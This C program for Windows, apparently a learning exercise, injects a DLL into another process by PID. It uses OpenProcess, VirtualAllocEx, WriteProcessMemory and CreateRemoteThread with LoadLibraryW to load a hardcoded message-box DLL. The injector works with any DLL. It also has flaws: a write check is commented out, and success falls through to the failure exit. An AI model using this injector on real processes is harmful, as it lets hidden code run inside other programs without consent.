#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]){
    if(argc<2){
        printf("? Usage: dllinjection <target PID>\n");
        return EXIT_FAILURE;
    }

    DWORD PID = atoi(argv[1]);
    wchar_t Dllpath[MAX_PATH] = L"C:\\Users\\mr-robot-txt\\Desktop\\DLLmessagebox.dll";
    size_t Dllpathsize = sizeof(Dllpath);
    DWORD TID = NULL;

    //get handle to a process
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        PID
    );

    if(hProcess == NULL){
        printf("! Failed to get handle to process id %ld Due to error: %ld\n", PID, GetLastError());
        return EXIT_FAILURE;
    }

    printf("* Successfully got the handle to process %ld\n", PID);

    //allocate memory inside the process
    LPVOID rBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        Dllpathsize,
        (MEM_COMMIT | MEM_RESERVE),
        PAGE_READWRITE
    );

    if(rBuffer == NULL){
        printf("! Failed to allocate memory in the process due to error: %ld\n", GetLastError());
        goto fail_exit;
    }

    printf("* Successfully allocated %llu bytes\n", Dllpathsize);

    //Write into the memory
    BOOL isWritten = WriteProcessMemory(
        hProcess,
        rBuffer,
        Dllpath,
        Dllpathsize,
        NULL
    );

    /* if(isWritten == NULL){
        printf("! Failed to write in the allocated memory due to error: %ld\n", GetLastError());
        goto fail_exit;
    } */

    printf("* Successfully wrote %llu bytes\n", Dllpathsize);

    //Get Address of LoadLibraryW function to use in CreateRemoteThread
    HMODULE hKernel32 = GetModuleHandleW(L"Kernel32"); //Get handle to Kernel32
    
    if(hKernel32 == NULL){
        printf("! Failed to get handle to the Kernel32 due to error: %ld\n", GetLastError());
        goto fail_exit;
    }

    printf("* Successfully gotten handle to Kernel32\n");

    LPTHREAD_START_ROUTINE addrLoadlibraryw = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");//Get address of loadlibraryw function

    //Create the Remote Thread to run our DLL
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        addrLoadlibraryw,
        rBuffer,
        0,
        &TID
    );

    if(hThread == NULL){
        printf("! Failed to create thread due to error: %ld\n", GetLastError());
        goto fail_exit;
    }

    printf("* Successfully created thread of id %ld to run the DLL\n* Waiting for Thread to finish\n", TID);
    WaitForSingleObject(hThread, INFINITE);
    printf("* Thread finished successfully\n* Closing handles to process and thread\n");
    CloseHandle(hThread);
    CloseHandle(hProcess);

    fail_exit:
        CloseHandle(hProcess);
        return EXIT_FAILURE;

    return 0;
}